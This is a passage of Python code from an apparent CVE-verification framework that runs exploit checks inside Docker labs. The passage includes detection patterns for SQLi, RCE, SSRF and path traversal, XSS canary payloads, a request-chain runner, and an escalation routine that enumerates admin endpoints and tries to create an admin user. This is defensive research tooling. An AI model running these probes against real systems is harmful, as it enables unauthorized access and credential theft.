        if "onerror=" in _bl or "onload=" in _bl:
            score += 0.35
            signals.append("event handler attribute (onerror/onload) found")
        # SSTI execution signals: 49 = 7*7, 7777777777 etc.
        if any(canary in _body for canary in ("49", "7777777777", "binoracle_ssti")):
            score += 0.55
            signals.append("SSTI arithmetic canary value found in body")
        if "{{" not in _body and ("{%" in _body or "}}" in _body):
            # Partial template execution
            score += 0.20
            signals.append("partial template execution trace")

    # --- SQLi signals ---
    if _vc in ("sqli", "sql-injection"):
        _SQL_ERRORS = [
            "you have an error in your sql syntax",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "ora-01756", "ora-00933",
            "pg_query(): query failed",
            "unterminated quoted string at or near",
            "sqlstate", "pdoexception",
            "mysql_fetch", "sqlite3.operationalerror",
        ]
        for _err in _SQL_ERRORS:
            if _err in _bl:
                score += 0.70
                signals.append(f"SQL error signature: '{_err[:40]}'")
                break
        # Row count or data exfiltration
        if confirm_string and confirm_string in _body:
            score += 0.80
            signals.append(f"confirm_string '{confirm_string[:40]}' found")
        elif any(pat in _body for pat in ("binoracle", "0x62696e6f", "sleep(5)", "SLEEP(5)")):
            score += 0.65
            signals.append("SQLi canary/sleep pattern found in body or headers")

    # --- RCE / command injection signals ---
    if _vc in ("rce", "command-injection", "os-command-injection", "code-injection"):
        _RCE_PATTERNS = [
            ("uid=0(root)", 0.90, "root uid in output"),
            ("uid=", 0.75, "uid= in output (command executed)"),
            ("/bin/sh", 0.70, "/bin/sh referenced in output"),
            ("root:x:0:0:", 0.85, "/etc/passwd content in output"),
            ("binoracle_rce_", 0.90, "RCE canary string found"),
            ("command not found", 0.30, "'command not found' (shell reached)"),
            ("total 0\ndrwxr", 0.60, "ls output pattern detected"),
        ]
        for pat, weight, label in _RCE_PATTERNS:
            if pat.lower() in _bl:
                score += weight
                signals.append(label)
                break
        # Timing signal: response took notably long (not detectable here, but
        # the __RCE_TIMING__ canary in confirm_string is handled upstream)

    # --- SSRF signals ---
    if _vc in ("ssrf", "server-side-request-forgery"):
        _SSRF_PATTERNS = [
            ("169.254.169.254", 0.80, "AWS/cloud metadata IP in body"),
            ("ami-id", 0.75, "AWS AMI metadata in body"),
            ("instance-id", 0.70, "cloud instance-id in body"),
            ("localhost", 0.40, "localhost referenced in body"),
            ("internal", 0.30, "'internal' server reference"),
        ]
        for pat, weight, label in _SSRF_PATTERNS:
            if pat in _bl:
                score += weight
                signals.append(label)
                break

    # --- LFI / path-traversal signals ---
    if _vc in ("lfi", "path-traversal", "directory-traversal"):
        _LFI_PATTERNS = [
            ("root:x:0:0:", 0.90, "/etc/passwd content found"),
            ("/bin/bash", 0.70, "/etc/passwd or /etc/shells content"),
            ("# /etc/", 0.65, "Linux config file content"),
            ("[boot loader]", 0.75, "boot.ini content found"),
            ("[extensions]", 0.65, "Windows INI file content found"),
            ("[global]", 0.50, "config file [global] section"),
        ]
        for pat, weight, label in _LFI_PATTERNS:
            if pat.lower() in _bl:
                score += weight
                signals.append(label)
                break

    # --- Missing-auth / IDOR signals ---
    if _vc in ("missing-authorization", "auth-bypass", "idor",
               "broken-access-control", "broken-object-level-authorization"):
        _PRIV_KEYWORDS = {
            "password": 0.60, "passwd": 0.60, "secret": 0.55,
            "api_key": 0.65, "access_token": 0.65, "private_key": 0.70,
            "ssn": 0.70, "credit_card": 0.70,
        }
        for kw, weight in _PRIV_KEYWORDS.items():
            if kw in _bl:
                score += weight
                signals.append(f"private data keyword '{kw}' in response")
                break
        # JSON array with more than 2 items — data enumeration
        import json as _json
        try:
            parsed = _json.loads(_body)
            if isinstance(parsed, list) and len(parsed) > 2:
                score += 0.40
                signals.append(f"JSON array with {len(parsed)} items (data enumeration)")
            elif isinstance(parsed, dict) and len(parsed) > 5:
                score += 0.25
                signals.append(f"JSON object with {len(parsed)} fields (possible data exposure)")
        except Exception:
            pass

    # Cap score and deduplicate signals
    score = min(score, 0.85)
    return {
        "partial_confidence": round(score, 2),
        "signals": signals[:8],
        "interesting": score >= 0.30,
    }


def _escalate_missing_auth_impact(
    base_url: str,
    verified_endpoint: str,
    bypass_headers: dict,
    on_step,
    budget_s: float = 60.0,
) -> dict:
    """After a missing-auth bypass is confirmed, probe what that access can actually do.

    Strategy (runs inside the lab while the container is still up):
    1. Enumerate data from the verified endpoint and sibling resource paths.
    2. Try POST to common creation endpoints (unauthorized write = higher impact).
    3. Classify the worst impact found across all probes.

    Returns a dict:
      impact_class: "credential_exposure" | "user_enumeration" | "data_enumeration" |
                    "unauthorized_creation" | "admin_access" | "unknown"
      evidence_snippets: list of {url, status, data_preview}
      max_impact_found: "critical" | "high" | "medium" | "low"
      escalation_summary: one-line human-readable summary
    """
    import time as _time
    import json as _json

    step = on_step or (lambda _m: None)
    t0 = _time.time()

    _CRED_KEYWORDS = {
        "password", "passwd", "secret", "token", "api_key", "apikey",
        "access_token", "refresh_token", "private_key",
        # REST API / cloud token patterns
        "bearer", "authorization", "auth_token", "client_secret",
        "aws_secret", "accesskeyid", "secretaccesskey",
        # CMS-specific
        "application_password", "app_password", "admin_password",
        "hash", "encrypted_password", "user_pass",
        # Key/signing material
        "jwt", "signing_key", "encryption_key", "hmac",
    }
    _USER_KEYWORDS = {
        "email", "username", "user_id", "userId", "login", "account",
        # Extended user info patterns
        "first_name", "last_name", "display_name", "user_login",
        "user_email", "phone", "address", "profile",
    }

    # Build candidate probe list from the verified endpoint + common admin paths
    ep_base = verified_endpoint.rstrip("/")
    # Sub-paths of the verified endpoint
    _sub_paths = [
        ep_base,
        ep_base + "?limit=10",
        ep_base + "?page=1&per_page=10",
        ep_base + "/1",
        ep_base + "/me",
        ep_base + "/profile",
    ]
    # Sibling/admin resource paths always worth trying
    _sibling_paths = [
        "/api/users", "/api/v1/users", "/api/v2/users",
        "/api/admin/users", "/admin/users", "/api/admin",
        "/api/keys", "/api/apikeys", "/api/api-keys",
        "/api/settings", "/api/config", "/api/configuration",
        "/api/secrets", "/api/tokens",
        "/api/accounts", "/api/members",
        # Gitea REST API
        "/api/v1/admin/users", "/api/v1/repos/search", "/api/v1/settings/api",
        # Nextcloud OCS API
        "/ocs/v1.php/cloud/users?format=json", "/ocs/v2.php/apps/admin_audit/api/v1",
        # Mattermost REST API
        "/api/v4/users", "/api/v4/config", "/api/v4/config/client?format=old",
    ]
    # POST creation probes (try these last, only if budget permits)
    _creation_paths = [
        (ep_base, "POST"),
        ("/api/users", "POST"),
        ("/api/admin/users", "POST"),
        ("/api/accounts", "POST"),
    ]

    get_probes = _sub_paths + _sibling_paths

    snippets: list = []
    impact_class = "unknown"
    max_impact = "low"
    worst_evidence: dict = {}

    # GET probes
    for path in get_probes[:12]:  # cap at 12 GET probes
        if _time.time() - t0 > budget_s * 0.75:
            break
        url = base_url.rstrip("/") + path
        try:
            r = _http_request("GET", url, headers=bypass_headers, timeout=8,
                              allow_redirects=False)
            if r.status_code not in range(200, 300):
                continue
            body = (getattr(r, "text", "") or "")[:2000]
            preview = body[:200]

            # Classify this response
            body_lower = body.lower()
            _has_cred = any(k in body_lower for k in _CRED_KEYWORDS)
            _has_user = any(k in body_lower for k in _USER_KEYWORDS)
            _has_email = "@" in body and ".com" in body
            _has_array = body.strip().startswith("[") or '"items"' in body or '"data":[' in body
            _has_admin = "admin" in path.lower()

            if _has_cred:
                _cls = "credential_exposure"
                _imp = "critical"
            elif _has_admin and _has_user:
                _cls = "admin_access"
                _imp = "critical"
            elif _has_email and _has_user:
                _cls = "user_enumeration"
                _imp = "high"
            elif _has_array and len(body) > 200:
                _cls = "data_enumeration"
                _imp = "high"
            elif r.status_code == 200:
                _cls = "unknown"
                _imp = "medium"
            else:
                continue

            # Update worst impact
            _imp_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1}
            if _imp_rank.get(_imp, 0) > _imp_rank.get(max_impact, 0):
                max_impact = _imp
                impact_class = _cls
                worst_evidence = {"url": url, "status": r.status_code,
                                  "data_preview": preview}

            snippets.append({"url": url, "status": r.status_code,
                              "data_preview": preview})
            step(f"  escalación: {path} → {r.status_code} [{_cls}]")
        except Exception:
            continue

    # POST creation probes (only if time allows)
    for path, method in _creation_paths:
        if _time.time() - t0 > budget_s * 0.90:
            break
        if len(snippets) >= 15:
            break
        url = base_url.rstrip("/") + path
        try:
            test_body = _json.dumps({"email": "test@binoracle.dev",
                                     "username": "binoracle_test",
                                     "password": "Test1234!", "role": "admin"})
            hdrs = dict(bypass_headers)
            hdrs["Content-Type"] = "application/json"
            r = _http_request(method, url, headers=hdrs, data=test_body,
                              timeout=8, allow_redirects=False)
            if r.status_code in (200, 201, 204):
                _cls = "unauthorized_creation"
                _imp = "critical"
                preview = (getattr(r, "text", "") or "")[:200]
                snippets.append({"url": url, "status": r.status_code,
                                  "data_preview": preview,
                                  "method": method})
                if _imp == "critical":
                    impact_class = _cls
                    max_impact = _imp
                    worst_evidence = {"url": url, "status": r.status_code,
                                      "data_preview": preview}
                step(f"  escalación: POST {path} → {r.status_code} [unauthorized_creation]")
        except Exception:
            continue

    if not snippets:
        return {}

    # Build human-readable summary
    _cls_labels = {
        "credential_exposure": "exposición de credenciales/tokens",
        "user_enumeration": "enumeración de usuarios/emails",
        "data_enumeration": "enumeración de datos sin autenticación",
        "unauthorized_creation": "creación no autorizada de recursos/usuarios",
        "admin_access": "acceso no autorizado a recursos de administración",
        "unknown": "acceso sin autenticación",
    }
    summary = (
        f"{_cls_labels.get(impact_class, impact_class)} "
        f"({len(snippets)} endpoint(s) expuesto(s), impacto máx: {max_impact.upper()})"
    )
    if worst_evidence:
        summary += f" — ej. {worst_evidence['url']} → HTTP {worst_evidence['status']}"

    step(f"  escalación completa: {impact_class} / {max_impact} / {len(snippets)} evidencias")

    return {
        "impact_class": impact_class,
        "evidence_snippets": snippets[:15],
        "max_impact_found": max_impact,
        "escalation_summary": summary,
    }


def _check_xss_reflected(response_body: str, payload: str) -> bool:
    """Return True if `payload` appears in `response_body` verbatim (unescaped).

    Checks:
    1. Literal payload string present in body (not HTML-escaped)
    2. Alert canary patterns: <script>alert( or <img src=x onerror=
    3. The payload does NOT appear only as &lt;...&gt; (fully escaped)
    """
    if not payload or not response_body:
        return False
    # Check 1: literal payload present
    if payload in response_body:
        # Verify it's not fully escaped — look for the raw < character
        if "<" in payload and "&lt;" not in response_body:
            return True
        if "<" not in payload:
            return True
    # Check 2: alert canary patterns that indicate execution context
    _canary_patterns = [
        "<script>alert(",
        "<script>alert(",  # fullwidth
        "<img src=x onerror=",
        "<img src=\"x\" onerror=",
        "<svg onload=",
        "<svg/onload=",
        "javascript:alert(",
        "';alert(",
        "\";alert(",
    ]
    body_lower = response_body.lower()
    for pattern in _canary_patterns:
        if pattern.lower() in body_lower:
            return True
    return False


def verify_stored_xss(
    source_dir: str,
    endpoint_create: str,
    endpoint_view: str,
    payload: str,
    confirm_string: str = "",
    auth_header: str = "",
    http_method_create: str = "POST",
    param_name: str = "content",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "",
    extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Two-request stored XSS verifier.

    1. POST payload to endpoint_create (with optional auth_header)
    2. GET endpoint_view — check if confirm_string (or the raw payload) appears in body

    Use for CVEs where XSS is stored via an admin/API endpoint and rendered elsewhere.
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()

    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        hdrs: dict = {}
        if auth_header:
            if ": " in auth_header:
                _h, _v = auth_header.split(": ", 1)
                hdrs[_h.strip()] = _v.strip()
            else:
                hdrs["Authorization"] = auth_header

        # Step 1: store the payload
        create_url = base_url + endpoint_create
        step(f"stored-xss: {http_method_create} {create_url} (inyectando payload)...")
        body_data = f"{param_name}={payload}"
        hdrs_create = dict(hdrs)
        hdrs_create.setdefault("Content-Type", "application/x-www-form-urlencoded")
        try:
            r_create = _http_request(http_method_create.upper(), create_url,
                                     data=body_data, headers=hdrs_create, timeout=15)
            # If form-encoded returns 400/415, retry with JSON body — many modern APIs
            # (Strapi, Directus, Ghost) only accept Content-Type: application/json
            _c_st = getattr(r_create, "status_code", 200)
            if _c_st in (400, 415):
                _json_hdrs = dict(hdrs)
                _json_hdrs["Content-Type"] = "application/json"
                r_create2 = _http_request(http_method_create.upper(), create_url,
                                          json={param_name: payload},
                                          headers=_json_hdrs, timeout=15)
                if getattr(r_create2, "status_code", 400) < 400:
                    r_create = r_create2
                    step(f"  create: form-encoded gave {_c_st}, JSON succeeded "
                         f"({r_create2.status_code})")
            step(f"  create response: {r_create.status_code}")
        except Exception as e:
            res.detail = f"stored-xss: error al enviar payload: {e}"
            return res

        # Step 2: retrieve and check
        view_url = base_url + endpoint_view
        step(f"stored-xss: GET {view_url} (buscando payload reflejado almacenado)...")
        try:
            r_view = _http_request("GET", view_url, headers=hdrs, timeout=15)
            view_body = getattr(r_view, "text", "") or getattr(r_view, "body", "") or ""
        except Exception as e:
            res.detail = f"stored-xss: error al recuperar vista: {e}"
            return res

        _cs = confirm_string or payload
        xss_found = _check_xss_reflected(view_body, payload)
        string_ok = (not confirm_string) or (confirm_string in view_body)

        res.evidence = {
            "base_url": base_url,
            "endpoint_create": endpoint_create,
            "endpoint_view": endpoint_view,
            "payload": payload,
            "create_status": getattr(r_create, "status_code", -1),
            "view_status": getattr(r_view, "status_code", -1),
            "confirm_string": _cs,
            "xss_reflected": xss_found,
            "body_snippet": view_body[:400],
        }

        if xss_found and string_ok:
            res.verified = True
            res.ok = True
            res.detail = (f"STORED XSS confirmado: payload '{payload[:60]}' encontrado "
                          f"sin escapar en {endpoint_view} tras almacenarlo via {endpoint_create}")
            # Extra: check if the XSS is also accessible unauthenticated (anon visitor).
            # This upgrades the finding from "admin can XSS themselves" to
            # "attacker stores, anonymous victim triggers" — a much higher severity.
            if hdrs:
                try:
                    import requests as _rq_xss
                    _r_anon = _rq_xss.get(view_url, timeout=10, allow_redirects=True)
                    _anon_body = getattr(_r_anon, "text", "") or ""
                    _anon_xss = _check_xss_reflected(_anon_body, payload)
                    if _anon_xss:
                        res.evidence["anon_xss_accessible"] = True
                        res.evidence["anon_view_status"] = _r_anon.status_code
                        res.detail += (" | ANON ACCESSIBLE: el payload también se refleja "
                                       "sin autenticación (máximo impacto: visitante anónimo ejecuta JS)")
                        step("stored-xss: VERIFICADO — también accesible sin autenticación")
                    else:
                        res.evidence["anon_xss_accessible"] = False
                        step("stored-xss: solo accesible con auth (anon no ve el payload)")
                except Exception:
                    pass
            step("stored-xss: VERIFICADO")
        else:
            res.ok = True
            res.detail = (f"stored-xss: payload NOT encontrado reflejado en {endpoint_view} "
                          f"(xss_found={xss_found}, string_ok={string_ok})")
            step(f"stored-xss: no verificado — {res.detail}")

        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_stored_xss: {e}"
        return res
    finally:
        step("desmontando laboratorio (stored-xss)...")
        if lab is not None:
            lab.teardown()


def run_request_chain(
    source_dir: str,
    steps: list,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "",
    extra_files: Optional[dict] = None,
    pkg_version: str = "",
    setup_commands: Optional[List[str]] = None,
    docker_image: str = "",
) -> WpVerifyResult:
    """Execute a multi-step HTTP request chain in a single Docker lab.

    This enables CVE classes that require more than one request to prove
    exploitability: stored XSS (create + view), CSRF (GET token + POST),
    privilege escalation (login + elevate + verify), etc.

    `steps`: list of dicts, each describing one HTTP request:
        endpoint:        str  — URL path, e.g. "/api/comments"
        method:          str  — "GET" / "POST" / "PUT" / "DELETE" / "PATCH"
        body:            str  — request body (JSON string or form-encoded)
        headers:         dict — extra headers for this step
        extract:         dict — {var_name: regex} — capture groups from
                                response body/headers for use in later steps
        confirm_string:  str  — if present, must appear in response body for
                                this step to be considered "confirmed"
        confirm_status:  int  — expected HTTP status (default: any 2xx)
        is_final:        bool — if True, this step's outcome decides verified

    Variable substitution: any value in `body`, `endpoint`, or `headers`
    that contains `{{VAR_NAME}}` is replaced with the value extracted from
    a previous step's `extract` mapping.

    Returns a WpVerifyResult with:
        verified = True iff the final step (or last step with is_final=True)
                   succeeds and its confirm_string is present (if set)
        evidence["chain_steps"] = list of per-step evidence dicts
    """
    import re as _re_chain
    _step = on_step or (lambda _m: None)
    res = WpVerifyResult()

    if not steps:
        res.detail = "run_request_chain: no steps provided"
        return res
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, _step, res, budget_s,
                                   dockerfile_body=dockerfile_body,
                                   extra_files=extra_files,
                                   pkg_version=pkg_version,
                                   setup_commands=setup_commands,
                                   docker_image=docker_image)
    if boot is None:
        return res
    lab, base_url, container = boot

    try:
        # Shared variable store populated by extract rules
        _vars: dict = {}

        def _substitute(text: str) -> str:
            """Replace {{VAR_NAME}} placeholders in text with extracted values."""
            if not text or "{{" not in text:
                return text
            for var, val in _vars.items():
                text = text.replace("{{" + var + "}}", str(val))
            return text

        # Persistent session for cookie jar — login→authenticate→attack chains
        import requests as _rq_chain_sess
        _chain_session = _rq_chain_sess.Session()
        _chain_session.verify = False

        def _chain_request(method: str, url: str, **kwargs):
            """Session-aware request; falls back to _http_request on error."""
            try:
                return _chain_session.request(method, url, **kwargs)
            except Exception:
                return _http_request(method, url, **kwargs)

        # SSRF callback listener — start if any step uses ssrf_url_param
        _chain_ssrf_listener = None
        _chain_ssrf_token: str = ""
        if any(s.get("ssrf_url_param") for s in steps):
            import secrets as _chain_sec
            _chain_ssrf_token = _chain_sec.token_hex(10)
            _chain_ssrf_listener = lab.start_listener()
            if _chain_ssrf_listener:
                _listener_ip = lab.container_ip(lab.listener)
                _cb_path = f"binoracle-ssrf-{_chain_ssrf_token}"
                _vars["ssrf_callback_url"] = f"http://{lab.listener}:8080/{_cb_path}"
                if _listener_ip:
                    _vars["ssrf_callback_ip_url"] = f"http://{_listener_ip}:8080/{_cb_path}"
                _step(f"  request-chain SSRF: listener arrancado, callback_url={_vars['ssrf_callback_url']}")
            else:
                _step("  WARN: no se pudo arrancar el listener SSRF para request-chain")

        chain_evidence: list = []
        final_step_idx = max(
            (i for i, s in enumerate(steps) if s.get("is_final")),
            default=len(steps) - 1,
        )

        for i, step_def in enumerate(steps[:8]):  # cap at 8 steps
            # Crypto step: compute AES-CBC/HMAC/base64/etc without sending an HTTP request.
            # Supported: type="aes_cbc_encrypt", type="base64_encode", type="hmac_sha1"
            if step_def.get("type") in ("aes_cbc_encrypt", "base64_encode",
                                        "base64_decode", "hmac_sha1", "hmac_sha256"):
                _op = step_def["type"]
                _plaintext = _substitute(step_def.get("plaintext", ""))
                _output_var = step_def.get("output_var", f"crypto_{i}")
                try:
                    if _op == "base64_encode":
                        import base64 as _b64
                        _vars[_output_var] = _b64.b64encode(_plaintext.encode()).decode()
                    elif _op == "base64_decode":
                        import base64 as _b64
                        _vars[_output_var] = _b64.b64decode(_plaintext).decode("latin-1")
                    elif _op == "aes_cbc_encrypt":
                        from Crypto.Cipher import AES as _AES
                        from Crypto.Util.Padding import pad as _pad
                        import base64 as _b64
                        _key_hex = _substitute(step_def.get("key_hex", "00" * 16))
                        _iv_hex = _substitute(step_def.get("iv_hex", "00" * 16))
                        _key = bytes.fromhex(_key_hex.replace(" ", ""))
                        _iv = bytes.fromhex(_iv_hex.replace(" ", ""))
                        _cipher = _AES.new(_key, _AES.MODE_CBC, _iv)
                        _ciphertext = _cipher.encrypt(_pad(_plaintext.encode(), 16))
                        _vars[_output_var] = _b64.b64encode(_ciphertext).decode()
                    elif _op in ("hmac_sha1", "hmac_sha256"):
                        import hmac as _hmac, hashlib as _hl, base64 as _b64
                        _algo = _hl.sha1 if _op == "hmac_sha1" else _hl.sha256
                        _secret = _substitute(step_def.get("secret", ""))
                        _mac = _hmac.new(_secret.encode(), _plaintext.encode(), _algo)
                        _vars[_output_var] = _b64.b64encode(_mac.digest()).decode()
                    _step(f"  request-chain[{i+1}/{len(steps)}]: {_op} → {_output_var}={_vars[_output_var][:40]!r}")
                except Exception as _ce:
                    _step(f"  [WARN] crypto step {_op} falló: {_ce}")
                continue

            ep = _substitute(step_def.get("endpoint", "/"))
            method = (step_def.get("method") or "GET").upper()
            body_raw = step_def.get("body") or ""
            # Substitute body: JSON dict stays as dict (for json= kwarg), string is substituted
            if isinstance(body_raw, dict):
                import json as _jbody
                body_raw = _jbody.dumps({k: _substitute(str(v)) if isinstance(v, str) else v
                                         for k, v in body_raw.items()})
            else:
                body_raw = _substitute(str(body_raw)) if body_raw else ""
            hdrs = {k: _substitute(str(v))
                    for k, v in (step_def.get("headers") or {}).items()}
            confirm = step_def.get("confirm_string") or ""
            expect_status = step_def.get("confirm_status")  # None = any 2xx
            extract_rules: dict = step_def.get("extract") or {}
            # URL query params (substituted): appended to the URL
            _qparams = {k: _substitute(str(v))
                        for k, v in (step_def.get("params") or
                                     step_def.get("query_params") or {}).items()}

            url = base_url.rstrip("/") + ep
            _step(f"  request-chain[{i+1}/{len(steps)}]: {method} {ep}")

            step_ev: dict = {
                "step": i + 1,
                "method": method,
                "endpoint": ep,
                "url": url,
            }

            # allow_redirects: True by default to follow login redirects (session cookie is set
            # on the final destination); steps can override with allow_redirects: false
            _follow_redirects = step_def.get("allow_redirects", True)
            try:
                r = _chain_request(method, url, headers=hdrs,
                                   data=body_raw or None,
                                   params=_qparams or None,
                                   timeout=15, allow_redirects=_follow_redirects)
                status = r.status_code
                body = getattr(r, "text", "") or ""
                step_ev["status"] = status
                step_ev["body_snippet"] = body[:400]

                # Apply extraction rules.
                # Pattern forms:
                #   "json:field"           — JSON object top-level field
                #   "json:field.subfield"  — nested JSON path (dot-separated)
                #   "header:Header-Name"   — specific response header value
                #   "regex:pattern"        — explicit regex with capture group
                #   anything else          — treated as a regex (backward compat)
                for var_name, pattern in extract_rules.items():
                    _extracted = None
                    if pattern.startswith("json:"):
                        _jpath = pattern[5:].split(".")
                        try:
                            import json as _jmod_chain
                            _jobj = _jmod_chain.loads(body)
                            for _jkey in _jpath:
                                if isinstance(_jobj, list):
                                    # Support array index: "[0]" or bare integer string
                                    _idx_str = _jkey.strip("[]")
                                    try:
                                        _jobj = _jobj[int(_idx_str)]
                                    except (ValueError, IndexError):
                                        _jobj = None
                                        break
                                elif isinstance(_jobj, dict):
                                    _jobj = _jobj.get(_jkey)
                                else:
                                    _jobj = None
                                    break
                            if _jobj is not None:
                                _extracted = str(_jobj)
                        except Exception:
                            pass
                        if _extracted is None:
                            # Fallback: regex on JSON string for the key
                            _jk = _jpath[-1]
                            _m_fb = _re_chain.search(
                                rf'["\']?{re.escape(_jk)}["\']?\s*[:=]\s*["\']?([^"\'\\,\}}\]]+)',
                                body)
                            if _m_fb:
                                _extracted = _m_fb.group(1).strip()
                    elif pattern.startswith("cookie:"):
                        # Extract a named cookie from the session's cookie jar
                        _cname = pattern[7:].strip()
                        _extracted = (_chain_session.cookies.get(_cname) or
                                      r.cookies.get(_cname))
                    elif pattern.startswith("header:"):
                        _hname = pattern[7:].strip()
                        _extracted = r.headers.get(_hname) or r.headers.get(_hname.lower())
                    elif pattern.startswith("regex:"):
                        _pat = pattern[6:]
                        m = _re_chain.search(_pat, body)
                        if m:
                            _extracted = m.group(1) if m.lastindex else m.group(0)
                        else:
                            for _hdr_name, hdr_val in r.headers.items():
                                m2 = _re_chain.search(_pat, hdr_val)
                                if m2:
                                    _extracted = m2.group(1) if m2.lastindex else m2.group(0)
                                    break
                    else:
                        # Legacy: bare regex pattern
                        m = _re_chain.search(pattern, body)
                        if m:
                            _extracted = m.group(1) if m.lastindex else m.group(0)
                        else:
                            for _hdr_name, hdr_val in r.headers.items():
                                m2 = _re_chain.search(pattern, hdr_val)
                                if m2:
                                    _extracted = m2.group(1) if m2.lastindex else m2.group(0)
                                    break
                    if _extracted is not None:
                        _vars[var_name] = _extracted
                        step_ev[f"extracted_{var_name}"] = _extracted
                        _step(f"    extracted {var_name}={_extracted[:60]!r}")

                # Evaluate step outcome
                _2xx = status in range(200, 300)
                _status_ok = (_2xx if expect_status is None
                              else status == expect_status)
                _confirm_ok = (not confirm) or (confirm in body)
                # When confirm_string is set and found in the body, treat the step as
                # status-ok even on HTTP 5xx — a template/app error can still produce
                # the injected string (e.g. SSTI RCE on CraftCMS returns 500 but executes).
                if not _status_ok and _confirm_ok and confirm and status in range(500, 600):
                    _status_ok = True
                    step_ev["status_ok_via_confirm_in_5xx"] = True
                    _step(f"    HTTP {status} but confirm_string '{confirm[:40]}' found → treating as ok")
                step_ev["status_ok"] = _status_ok
                step_ev["confirm_ok"] = _confirm_ok
                _step(f"    → HTTP {status}, confirm_ok={_confirm_ok}")

            except Exception as exc:
                step_ev["error"] = str(exc)
                _step(f"    error: {exc}")
                chain_evidence.append(step_ev)
                # Non-final steps: continue; final step: abort
                if i == final_step_idx:
                    res.detail = f"error en step final: {exc}"
                    break
                continue

            # SSRF callback check: when this step has ssrf_url_param and listener is running
            _ssrf_step_verified = False
            if step_def.get("ssrf_url_param") and _chain_ssrf_listener and _chain_ssrf_token:
                import time as _time_chain
                _time_chain.sleep(2)
                _ssrf_log = lab.listener_log()
                if _chain_ssrf_token in _ssrf_log:
                    _ssrf_step_verified = True
                    step_ev["ssrf_callback_received"] = True
                    step_ev["ssrf_log_snippet"] = _ssrf_log[:300]
                    _step(f"    SSRF: callback recibido (token={_chain_ssrf_token[:8]}…)")
                else:
                    step_ev["ssrf_callback_received"] = False
                    _step(f"    SSRF: callback NO recibido tras step {i+1}")

            chain_evidence.append(step_ev)

            # Final step determines verified
            if i == final_step_idx:
                # SSRF step verified overrides normal confirm logic when ssrf_url_param set
                if step_def.get("ssrf_url_param") and _chain_ssrf_listener:
                    res.verified = _ssrf_step_verified
                    res.ok = True
                    if res.verified:
                        res.detail = (
                            f"request-chain SSRF VERIFICADO: listener recibió callback "
                            f"(token={_chain_ssrf_token[:8]}…) en paso {i+1}"
                        )
                        _step(f"  request-chain SSRF VERIFICADO en {len(steps)} pasos")
                    else:
                        res.detail = (
                            f"request-chain SSRF no verificado: callback no recibido "
                            f"en paso {i+1} → HTTP {status}"
                        )
                        _step("  request-chain SSRF no verificado")
                else:
                    res.verified = _status_ok and _confirm_ok
                    res.ok = True
                    if res.verified:
                        res.detail = (
                            f"request-chain VERIFICADO: {len(steps)} paso(s), "
                            f"step final {method} {ep} → HTTP {status}"
                            + (f", confirm_string='{confirm}' presente" if confirm else "")
                        )
                        _step(f"  request-chain VERIFICADO en {len(steps)} pasos")
                    else:
                        res.detail = (
                            f"request-chain no verificado: step final {method} {ep} → "
                            f"HTTP {status}, status_ok={_status_ok}, confirm_ok={_confirm_ok}"
                        )
                    _step(f"  request-chain no verificado: {res.detail}")
                break

        res.evidence = {
            "base_url": base_url,
            "container": container,
            "chain_steps": chain_evidence,
            "extracted_vars": {k: v[:200] for k, v in _vars.items()},
        }
        if not res.ok:
            res.ok = True
            res.detail = res.detail or "chain completado sin verificacion"

        return res
    except Exception as e:
        res.detail = f"error en request-chain: {e}"
        return res
    finally:
        _step("desmontando laboratorio (request-chain)...")
        if lab is not None:
            lab.teardown()


def verify_generic_header_bypass_candidates(
    source_dir: str, endpoint: str, http_method: str,
    candidates: list,
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    vuln_class: str = "",
    pkg_version: str = "",
    docker_image: str = "",
) -> WpVerifyResult:
    """Iterate through bypass header candidates using ONE shared lab instance.

    Builds and starts the Docker lab once, then tries each (header, value) candidate
    against the same running container. This avoids rebuilding for each candidate
    (critical for large apps like Go/Java that take minutes to compile).

    `candidates`: list of (header_name, header_value) tuples, dicts with
    keys "header"/"value", or "Header-Name: value" strings.

    Returns the first verified result, or the last failed result if none works.
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()

    # Parse candidates
    parsed: list = []
    for cand in candidates:
        if isinstance(cand, dict):
            hdr = cand.get("header") or cand.get("name") or ""
            val = cand.get("value") or ""
        elif isinstance(cand, (list, tuple)) and len(cand) >= 2:
            hdr, val = str(cand[0]), str(cand[1])
        elif isinstance(cand, str) and ": " in cand:
            hdr, val = cand.split(": ", 1)
        else:
            continue
        if hdr and val:
            parsed.append((hdr.strip(), val.strip()))

    if not parsed:
        res.detail = "sin candidatos de bypass para probar"
        return res

    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        return res

    # Build the lab once
    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body,
                                   extra_files=extra_files,
                                   pkg_version=pkg_version,
                                   docker_image=docker_image)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "GET").upper().split("/")[0].strip() or "GET"
        url = base_url + endpoint

        # Baseline: request without bypass (expect 3xx/4xx)
        step(f"probando SIN bypass: {m} {url}")
        status_normal = -1
        body_normal = ""
        try:
            r_normal = _http_request(m, url, timeout=10, allow_redirects=False)
            status_normal = r_normal.status_code
            body_normal = getattr(r_normal, "text", "") or ""
        except Exception as e:
            step(f"  error en peticion normal: {e}")

        # For missing-authorization: if endpoint already responds 2xx without any
        # auth or special header, that IS the vulnerability — no bypass header needed.
        _is_missing_auth = vuln_class.lower().replace(" ", "-") in (
            "missing-authorization", "broken-access-control",
            "idor", "auth-bypass",
        )
        if _is_missing_auth and status_normal in range(200, 300):
